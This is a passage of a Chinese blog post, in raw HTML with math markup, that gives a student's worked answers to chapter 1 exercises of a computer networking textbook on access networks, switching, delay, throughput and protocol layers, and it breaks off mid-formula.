                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="课后习题和问题"><a class="markdownIt-Anchor" href="#课后习题和问题"></a> 课后习题和问题</h2>
<h3 id="11"><a class="markdownIt-Anchor" href="#11"></a> 1.1</h3>
<ol>
<li>主机与端系统之间没有什么不同，二者均指连接到互联网的计算设备，运行网络应用程序，是同一个意思。端系统可以是手机、电脑、智能手表、掌机等。Web服务器是一种端系统，它为互联网中的其他端系统提供内容服务。</li>
<li>略</li>
<li>只有让尽可能多的协议支持相同的标准，才能够更好地实现互联网的互联互通，便于互联网的建设。</li>
</ol>
<h3 id="12"><a class="markdownIt-Anchor" href="#12"></a> 1.2</h3>
<ol start="4">
<li>住宅接入：DSL、电缆、FTTH、卫星、拨号接入、以太网、WiFi等<br />
公司接入：以太网、WiFi等<br />
广域无线接入：3G、4G、LTE等</li>
<li>HFC传输速率在用户间是共享的，在下行HFC信道中所有的数据包都是从区域电缆头端发出的，顺序确定，因此不会存在碰撞。</li>
<li>略</li>
<li>从10Mbps到10Gbps不等。</li>
<li>双绞铜线和光纤。</li>
<li>Modem拨号传输速率不大于56Kbps，专用<br />
HFC最高40Mbps/10Mbps下行/上行速率，共享<br />
DSL数字用户线55Mbps/15Mbps下行/上行速率，专用<br />
FTTH光纤到户最高100Mbps/4Mbps下行/上行速率，共享</li>
<li>共享的无线接入网络连接端系统和路由器，通过基站（无线接入点）接入。<br />
无线局域网（WIFI）和无线广域网（3G、4G、5G）。WIFI是无线短距离的局域网传输，不需要电话卡，无线广域网的可连接范围更大。</li>
</ol>
<h3 id="13"><a class="markdownIt-Anchor" href="#13"></a> 1.3</h3>
<ol start="11">
<li>将数据包从发送主机发送到交换机需要的时间为L/R<sub>1</sub>，将数据包从交换机发送到目标主机需要的时间为L/R<sub>2</sub>，总时延为两者之和。</li>
<li>与分组交换相比，电路交换会为每一条链路预留资源，能够保证恒定的传输速率，而大多数分组交换网络都没有这种保证。<br />
FDM需要多个滤波器实现，而TDM不需要。</li>
<li>a. 使用电路交换能够支持2个用户，因为电路交换会预留资源，2Mbps的链路在一个时刻只能够为2个用户分配足够的资源。<br />
b. 如果两个或更少的用户传输，链路中传输的数据量没有达到其阈值，因此很少有排队时延。当有超过2个用户传输时，由于这些用户原来需求的总传输速率大于该链路的带宽，因此只能降低每个用户的传输速率，且链路一直在满负荷工作，容易造成排队时延。<br />
c. 每个用户仅传输20%的时间，因此某指定用户在特定时刻正在传输的概率为20%。<br />
d. 20%<sup>3</sup>=0.008，只有在3个用户同时传输时才会造成队列增加，因此时间比率为0.008。（由此可以计算出队列减少的时间比率为1-0.008-3×0.032=0.896）</li>
<li>等级结构中级别相同的两个ISP互相对等可以减少数据交换的成本，IXP（因特网交互点）可以通过计算经过自身的流量收取一定的费用。</li>
<li>可以让互联网中的用户更加快捷地访问自身提升体验，同时避开IXP等中间商，一定程度上降低运营成本。</li>
</ol>
<h3 id="14"><a class="markdownIt-Anchor" href="#14"></a> 1.4</h3>
<ol start="16">
<li>某源主机跨越一条固定路由向某目的主机发送一分组。端到端时延由传输时延、传播时延、排队时延、处理时延等组成，其中传输时延固定，由链路的带宽决定；传播时延固定，由传播媒介决定，排队时延不固定，由链路的阻塞情况决定；处理时延一般固定，由路由器的处理速度决定。</li>
<li>当传播时延小、速率高、分组长度短时，分组的第一个比特到达接收方之前发送方已经结束了传输。当传播时延小、速率低、分组长度长时，发送方完成传输之前第一个比特已经到达接收方。</li>
<li>这个分组的传输速率为1000/(2×10<sup>6</sup>)=5×10<sup>-4</sup>s，传播时延为0.01s，故一共至少需要0.0105s。一般地，长度为L的分组经过距离为d的链路传播，传播速率为s并且传输速率为Rbps，需要使用(L/R)+(d/s)，该时延与传输速率有关。</li>
<li>a. 吞吐量为500Kbps，即三段链路中速率的最小值<br />
b. 64s，注意500Kbps指的是500K比特不是500K字节<br />
c. 100Kbps，320s。</li>
<li>端系统A首先根据链路需要将数据分为多个段，并为每一个段添加首部信息，产生多个分组。分组之一到达某分组交换机时，该分组交换机可以使用分组中的目的主机MAC地址来决定应该通过哪个端口转发到哪一条链路。</li>
<li>略</li>
</ol>
<h3 id="15"><a class="markdownIt-Anchor" href="#15"></a> 1.5</h3>
<ol start="22">
<li>差错控制、流量控制、多路复用/分解、报文分段、重新装配、连接建立。可能。</li>
<li>从低到高依次为物理层、链路层、网络层、运输层、应用层。应用层是网络应用程序及它们的应用层协议存留的地方，用于端系统中应用于应用之间的信息交换。运输层在应用程序端点之间传送应用程序报文。网络层用于将数据包从一台主机移动到另一台主机中。链路层用于将分组从链路中的一个节点发送到另外一个节点。物理层用于将该帧的一个个比特从一个节点发送到另外一个节点。</li>
<li>位于应用层的信息分组称为应用层报文，将运输层的分组称为运输层报文段，位于网络层的分组称为网络层数据报，位于链路层的分组称为链路层帧。注意这4个层次对于分组的称呼都不相同，有报文、报文段、数据报和帧。</li>
<li>路由器可以处理网络层、链路层和物理层，链路层交换机可以处理链路层和物理层，主机处理所有5个层次。</li>
</ol>
<h2 id="习题"><a class="markdownIt-Anchor" href="#习题"></a> 习题</h2>
<ol>
<li>略</li>
<li>一个分组发送所需要的时间为NL/R，传输速率为R，因此最后一个分组开始发送的时刻是(P-1)L/R，故这些分组全部发送完的时刻等于最后一个分组发送完的时刻，即(N+P-1)L/R</li>
<li>a. 电路交换网络，因为电路交换网络在连接成功后能够保证应用以一定的带宽，从而保证一定的最小传输速率，有效减少该应用受到其他应用产生的影响。<br />
b. 不需要，因为应用程序传输速率的总和小于每条链路的各自容量，不会发生拥塞。</li>
<li>a. 从A到B：4条。从B到C：4条。从C到D：4条。从D到A：4条。<br />
b. 8条。<br />
c. 能，各用2条。</li>
<li>a. 10辆汽车之中最后一辆汽车通过收费站的时刻为2分钟。其在之后还需要通过2个收费站用4分钟（本题的设定是先到的车会在收费站入口等待后到的车，如果不等待则在后面的收费站后到的车不需要等待前面的车服务完成），在路上行驶的时间为90分钟，因此端到端实验为96分钟。<br />
b. 94分48秒。</li>
<li>a. 传播时延d<sub>prop</sub>=m/s<br />
b. 传输时间d<sub>trans</sub>=L/R<br />
c. 端到端时延=传播时延+传输时延=m/s+L/R<br />
d. 在时刻d<sub>trans</sub>，该分组的第一个比特刚刚被输入到链路中，位于主机A端口处。<br />
e. 当传播时延&gt;传输时延时，在d<sub>trans</sub>，即分组被全部输入到链路中时，分组的第一个比特仍然在链路中传播，还没有到达主机B。<br />
f. 已经到达主机B。<br />
g. m/s=L/R：m=536km。</li>
<li>数字比特流的生成速率为56Kbps，一个分组的数据部分为56字节，因此产生两个分组的间隔时间为8ms。考虑到一个分组的产生必然需要这个分组中的所有数据都产生完成。那么一个分组的第一个比特产生到这个分组中最后一个比特产生的时间差为56Bytes/64Kbps=7ms。这条链路的传输速率为2Mbps，因此有传输时延等于0.224ms，传播时延为10ms。如果不算主机B的处理时延，时延应该为17.224ms。</li>
<li>a. 20个<br />
b. 每个用户仅有10%的时间在传输，因此某给定用户正在传输的概率为10%。<br />
c. 在有120个用户时，当0&lt;=n&lt;=20时实际有n个用户传输的概率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>C</mi><mn>120</mn><mi>n</mi></msubsup><mn>0.</mn><msup><mn>1</mn><mi>n</mi></msup><mn>0.</mn><msup><mn>9</mn><mrow><mn>120</mn><mo>−</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">C_{120}^n0.1^n0.9^{120-n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord">0</span><span class="mord">.</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord">0</span><span class="mord">.</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>。<br />
d. <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mn>20</mn></msubsup><msubsup><mi>C</mi><mn>120</mn><mi>n</mi></msubsup><mn>0.</mn><msup><mn>1</mn><mi>n</mi></msup><mn>0.</mn><msup><mn>9</mn><mrow><mn>120</mn><mo>−</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">1-\sum_{n=0}^{20}C_{120}^n0.1^n0.9^{120-n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.253718em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord">0</span><span class="mord">.</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord">0</span><span class="mord">.</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></li>
<li>10000；略</li>
<li>端到端时延为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mn>3</mn></msubsup><mo stretchy="false">(</mo><mfrac><msub><mi>d</mi><mi>i</mi></msub><msub><mi>s</mi><mi>i</mi></msub></mfrac><mo>+</mo><mfrac><mi>L</mi><msub><mi>R</mi><mi>i</mi></msub></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{i=0}^3(\frac{d_i}{s_i}+\frac{L}{R_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.399108em;vertical-align:-0.44509999999999994em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8962079999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.00773em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span>，另外还有两个分组交换机的处理时间2d<sub>proc</sub>。二者之和即为总的端到端时延。解释：每一个分组在到达一个分组交换机需要在该分组完全到达分组交换机才能进行处理和转发，因此3段链路一共有3个传输时延。可以观察一个分组的最后一个字节。当其到达一个分组交换机之后还需要等待处理时间以及该分组前面所有字节传输完成之后才能继续传输。代入数值计算得到时延为18+6+40=64ms。</li>
<li>如果分组交换机不存储转发分组而是立即传输，且处理时间为0，那么这些分组交换机就如同不存在一般。端到端时延为6+40=46ms。这6ms指的是传输时延。</li>
<li>当该分组到达时，分组交换机还需要传输6750字节的分组，需要的传输时间为：6750×8/2M=27ms，即为排队时延。在一般情况下，还需要传输(n+1)L-x字节数据，排队时延为8((n+1)L-x)/R。</li>
<li>a. 第一个传输的分组排队时延为0，第二个传输的分组排队时延等于第一个分组的传输时延，为L/R，第三个排队时延为2L/R，以此类推，平均排队时延为(n(n-1)/2)L/Rn=(n-1)L/2R。<br />
b. N个分组在LN/R之内可以全部传输完成，因此前N个分组不会影响到后N个分组的传输。平均排队时延依然为(n-1)L/2R。</li>
<li>a. 总时延=排队时延+传输时延=IL/R(i-I) + L/R<br />
b. 略</li>
<li>时延=IL/R(i-I) + L/R=1/(μ-a)</li>
<li>即N=11，传输时延是传输速率的倒数，故总时延为20ms，平均分组到达率a=550分组/s。</li>
<li>如果中间经过若干个分组交换机，那么总的端到端实验等于所有分组交换机的处理时延、传输时延、排队时延与链路传播时延之和。</li>
<li>略</li>
<li>略</li>
<li>一个客户-服务器之间的吞吐量是R<sub>s</sub>、R<sub>c</sub>和R/M的最小值（所有客户端与服务器的链路平均分配带宽）</li>
<li>能够取得的最大吞吐量为M条路径中每条路径链路传输速率的最小值的最大值。之和。</li>
<li>(1-p)<sup>n</sup>；倒数-1，因为第一次不属于重传。</li>
<li>a. 间隔时间即为传输时延L/R。<br />
b. 是可能的。由于第一段链路的带宽大于第二段链路，因此第一个分组的第一个比特和第二个分组的第一个比特在第一段链路中到达同一个位置的时间差较小。由于第二段链路的带宽较小，因此第一个分组在第二段链路中的传输时延大于第一段链路，那么第一个分组的最后一个比特还没有进入第二段链路时，第二个分组的最后一个比特已经进入了交换机的缓存，这就造成了排队时延。如果两个分组的发送间隔时间T，为保证第二个分组不排队，T至少应该为L/R<sub>c</sub>-L/R<sub>s</sub>。</li>
<li>快递</li>
<li>a. 带宽-时延积=2Mbps×2×10<sup>7</sup>m/(2.5×10<sup>8</sup>m/s)=0.16Mb<br />
b. 带宽-时延积一个方面的意义就是某个时刻这段链路正在传输的比特数量的最大值，即160Kb。在链路上具有的比特数量的最大值为160Kb。<br />
c. 见上一题<br />
d. 一个比特的宽度为20000km/0.16Mb=0.125km/b，即125m一个bit。比一个足球场更长。<br />
e. 一个比特宽度=m/(Rm/s)=s/R。</li>
<li>s/R=m，即R=s/m（值为12.5bps）时一个比特的长度与该链路的长度相等。</li>
<li>a. 此时带宽-时延积=80Mb<br />
b. 80Mb<br />
c. 0.25m</li>
<li>a. 需要0.48s<br />
b. 需要2s，每一次传输都有0.02s的传输时延和0.08s的传播时延<br />
c. 第一个更小，第二个没有充分利用带宽资源</li>
<li>a. 传播时延为3.6×10<sup>4</sup>km/(2.4×10<sup>8</sup>m/s)=150ms。<br />
b. 带宽-时延积=10Mbps×150ms=1.5Mb<br />
c. 能够连续传输的x的最小值为600Mb</li>
<li>略</li>
<li>a. 在没有报文分段的情况下，从源主机到第一台分组交换机移动报文需要4s时间，从源主机移动到目标主机需要12s时间。<br />
b. 从源主机移动第一个分组到第一台交换机需要5ms，从第一台交换机发送第一个分组到第二台交换机，需要5ms，从源主机发送第二个分组到第一台交换机需要5ms，在第10ms时第二个分组能够被第一台交换机全部收到。<br />
c. 每一个分组在一条链路上的传输时延为5ms，那么最后一个分组开始传输的时刻为3.995s。一个分组经过3条链路的时间为15ms，因此最后一个分组传输完成的时刻为4.01s。<br />
d. 可以使得分组交换机没有必要将缓存容量设计得很大，而且当报文出现错误时，将报文分段可以只重新传输这一个分组即可。<br />
e. 报文分段的缺点有分段中的头部信息占用的带宽增加。</li>
<li>略</li>
<li>一个分组在一条链路上的传输时延为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>80</mn><mo>+</mo><mi>S</mi></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{80+S}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，一共有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>F</mi><mi>S</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{F}{S}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个分组，最后一个分组开始传输的时刻为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mi>F</mi><mi>S</mi></mfrac><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mfrac><mrow><mn>80</mn><mo>+</mo><mi>S</mi></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">(\frac{F}{S}-1)\frac{80+S}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，其通过三段链路传输的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>3</mn><mo stretchy="false">(</mo><mn>80</mn><mo>+</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{3(80+S)}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mopen mtight">(</span><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，故移动该文件所需时延为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mi>F</mi><mi>S</mi></mfrac><mo>+</mo><mn>2</mn><mo stretchy="false">)</mo><mfrac><mrow><mn>80</mn><mo>+</mo><mi>S</mi></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">(\frac{F}{S}+2)\frac{80+S}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 